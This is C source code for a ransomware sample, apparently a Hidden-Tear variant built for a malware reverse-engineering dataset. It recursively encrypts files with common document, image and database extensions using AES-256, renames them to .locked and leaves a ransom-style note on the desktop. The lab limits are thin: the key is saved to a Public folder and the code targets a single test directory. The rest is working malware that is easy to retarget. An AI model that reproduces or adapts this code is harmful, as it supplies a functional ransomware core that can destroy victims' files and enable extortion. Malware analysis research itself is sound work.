// A01_2 Hidden-Tear variant with Local Encryption and Coercion via Ransomnote
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <ctype.h>
#include <windows.h>
#include <wincrypt.h>
#include <shlwapi.h>

#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "shlwapi.lib")

// Structure to represent the A01_2_Sample class
typedef struct
{
    char user_name[MAX_PATH];
    char user_dir[MAX_PATH];
} A01_2_Sample;

// Function prototypes
void a01_2_sample_init(A01_2_Sample *self);
void a01_2_sample_run(A01_2_Sample *self);
unsigned char *a01_2_sample_aes_encrypt(const unsigned char *plaintext, size_t plaintext_len, const char *key, size_t *out_len);
char *a01_2_sample_generate_key(int length);
void a01_2_sample_encrypt_file(const char *file, const char *key);
void a01_2_sample_encrypt_directory(const char *location, const char *key);
void a01_2_sample_start_action(A01_2_Sample *self);
void a01_2_sample_message_creator(A01_2_Sample *self);

// Helper function to convert string to lowercase
void to_lower_string(char *str)
{
    for (; *str; ++str)
        *str = (char)tolower((unsigned char)*str);
}

void a01_2_sample_init(A01_2_Sample *self)
{
    // In C++, we simulate the environment variable retrieval
    char *env_user = getenv("USERNAME");
    if (env_user != NULL)
    {
        strncpy(self->user_name, env_user, MAX_PATH - 1);
        self->user_name[MAX_PATH - 1] = '\0';
    }
    else
    {
        strcpy(self->user_name, "DefaultUser");
    }
    strcpy(self->user_dir, "C:\\Users\\");
}

void a01_2_sample_run(A01_2_Sample *self)
{
    // starts encryption at form load
    a01_2_sample_start_action(self);
}

// AES encryption algorithm
unsigned char *a01_2_sample_aes_encrypt(const unsigned char *plaintext, size_t plaintext_len, const char *key, size_t *out_len)
{
    HCRYPTPROV hProv = 0;
    HCRYPTHASH hHash = 0;
    HCRYPTKEY hKey = 0;
    unsigned char *encrypted = NULL;

    if (!CryptAcquireContext(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT))
    {
        return NULL;
    }

    if (!CryptCreateHash(hProv, CALG_SHA_256, 0, 0, &hHash))
    {
        CryptReleaseContext(hProv, 0);
        return NULL;
    }

    if (!CryptHashData(hHash, (const BYTE *)key, (DWORD)strlen(key), 0))
    {
        CryptDestroyHash(hHash);
        CryptReleaseContext(hProv, 0);
        return NULL;
    }

    if (!CryptDeriveKey(hProv, CALG_AES_256, hHash, 0, &hKey))
    {
        CryptDestroyHash(hHash);
        CryptReleaseContext(hProv, 0);
        return NULL;
    }

    DWORD dataLen = (DWORD)plaintext_len;
    DWORD bufferLen = dataLen + 16; // Padding space
    encrypted = (unsigned char *)malloc(bufferLen);
    if (encrypted == NULL)
    {
        CryptDestroyKey(hKey);
        CryptDestroyHash(hHash);
        CryptReleaseContext(hProv, 0);
        return NULL;
    }

    memcpy(encrypted, plaintext, plaintext_len);

    if (!CryptEncrypt(hKey, 0, TRUE, 0, (BYTE *)encrypted, &dataLen, bufferLen))
    {
        free(encrypted);
        encrypted = NULL;
        *out_len = 0;
    }
    else
    {
        *out_len = (size_t)dataLen;
    }

    CryptDestroyKey(hKey);
    CryptDestroyHash(hHash);
    CryptReleaseContext(hProv, 0);

    return encrypted;
}

// creates random encryption key
char *a01_2_sample_generate_key(int length)
{
    const char *valid = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890*!=&?&/";
    size_t valid_len = strlen(valid);
    char *res = (char *)malloc(length + 1);
    if (res == NULL)
        return NULL;

    // Using standard C rand() for simplicity, seeded in main
    for (int i = 0; i < length; i++)
    {
        res[i] = valid[rand() % valid_len];
    }
    res[length] = '\0';
    return res;
}

// Encrypts single file
void a01_2_sample_encrypt_file(const char *file, const char *key)
{
    // Check if file ends with .locked
    const char *extension = PathFindExtensionA(file);
    char ext_lower[MAX_PATH];
    strcpy(ext_lower, extension);
    to_lower_string(ext_lower);

    if (strcmp(ext_lower, ".locked") == 0)
    {
        return;
    }

    FILE *input = fopen(file, "rb");
    if (!input)
    {
        return;
    }

    fseek(input, 0, SEEK_END);
    long file_size = ftell(input);
    fseek(input, 0, SEEK_SET);

    unsigned char *bytes_to_be_encrypted = (unsigned char *)malloc(file_size);
    if (!bytes_to_be_encrypted)
    {
        fclose(input);
        return;
    }
    fread(bytes_to_be_encrypted, 1, file_size, input);
    fclose(input);

    // Derive AES key and encrypt file contents using CryptoAPI.
    size_t encrypted_len = 0;
    unsigned char *bytes_encrypted = a01_2_sample_aes_encrypt(bytes_to_be_encrypted, (size_t)file_size, key, &encrypted_len);

    free(bytes_to_be_encrypted);

    if (bytes_encrypted == NULL)
    {
        return;
    }

    // Write all bytes
    FILE *output = fopen(file, "wb");
    if (!output)
    {
        free(bytes_encrypted);
        return;
    }
    fwrite(bytes_encrypted, 1, encrypted_len, output);
    fclose(output);
    free(bytes_encrypted);

    // Move file to .locked
    char new_name[MAX_PATH];
    snprintf(new_name, MAX_PATH, "%s.locked", file);
    rename(file, new_name);
}

// Encrypts a directory and all its subdirectories
void a01_2_sample_encrypt_directory(const char *location, const char *key)
{
    // extensions to be encrypt
    const char *valid_extensions[] = {
        ".txt", ".doc", ".docx", ".xls", ".xlsx", ".ppt", ".pptx", ".odt", ".jpg", ".png", ".csv", ".sql", ".mdb", ".sln", ".php", ".asp", ".aspx", ".html", ".xml", ".psd"};
    int num_extensions = sizeof(valid_extensions) / sizeof(valid_extensions[0]);

    char search_path[MAX_PATH];
    snprintf(search_path, MAX_PATH, "%s\\*", location);

    WIN32_FIND_DATAA find_data;
    HANDLE hFind = FindFirstFileA(search_path, &find_data);

    if (hFind == INVALID_HANDLE_VALUE)
    {
        return;
    }

    do
    {
        if (strcmp(find_data.cFileName, ".") == 0 || strcmp(find_data.cFileName, "..") == 0)
        {
            continue;
        }

        char full_path[MAX_PATH];
        snprintf(full_path, MAX_PATH, "%s\\%s", location, find_data.cFileName);

        if (!(find_data.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY))
        {
            const char *ext = PathFindExtensionA(full_path);
            char ext_lower[MAX_PATH];
            strcpy(ext_lower, ext);
            to_lower_string(ext_lower);

            int isValid = 0;
            for (int i = 0; i < num_extensions; i++)
            {
                if (strcmp(ext_lower, valid_extensions[i]) == 0)
                {
                    isValid = 1;
                    break;
                }
            }

            if (isValid)
            {
                a01_2_sample_encrypt_file(full_path, key);
            }
        }
        else
        {
            a01_2_sample_encrypt_directory(full_path, key);
        }
    } while (FindNextFileA(hFind, &find_data));

    FindClose(hFind);
}

// Starts the encryption process
void a01_2_sample_start_action(A01_2_Sample *self)
{
    char *key = a01_2_sample_generate_key(15);
    const char *key_path = "C:\\Users\\Public\\A01_2_Lab_Encryption_Key.txt";

    FILE *key_file = fopen(key_path, "w");
    if (key_file)
    {
        fprintf(key_file, "%s", key);
        fclose(key_file);
    }

    const char *start_path = "C:\\Users\\Public\\A01_TestData";

    if (PathFileExistsA(start_path) && PathIsDirectoryA(start_path))
    {
        a01_2_sample_encrypt_directory(start_path, key);
    }
    a01_2_sample_message_creator(self);

    // Clear key
    memset(key, 0, strlen(key));
    free(key);

    // Application.Exit() equivalent
    exit(0);
}

void a01_2_sample_message_creator(A01_2_Sample *self)
{
    const char *path = "\\Desktop\\READ_IT.txt";
    char fullpath[MAX_PATH];
    snprintf(fullpath, MAX_PATH, "%s%s%s", self->user_dir, self->user_name, path);

    FILE *note_file = fopen(fullpath, "w");
    if (note_file)
    {
        fprintf(note_file, "A01_2 controlled ransomware/coercion sample.\n");
        fprintf(note_file, "Files in C:\\Users\\Public\\A01_TestData have been encrypted.\n");
        fprintf(note_file, "This note is generated for malware reverse-engineering dataset analysis.\n");
        fprintf(note_file, "No payment is required. Use the lab key file to decrypt test files.\n");
        fclose(note_file);
    }
}

// Program class equivalent
typedef struct
{
} Program;

void program_main()
{
    A01_2_Sample sample;
    a01_2_sample_init(&sample);
    a01_2_sample_run(&sample);
}

int main()
{
    // Seed random number generator for key generation
    srand((unsigned int)GetTickCount());
    program_main();
    return 0;
}
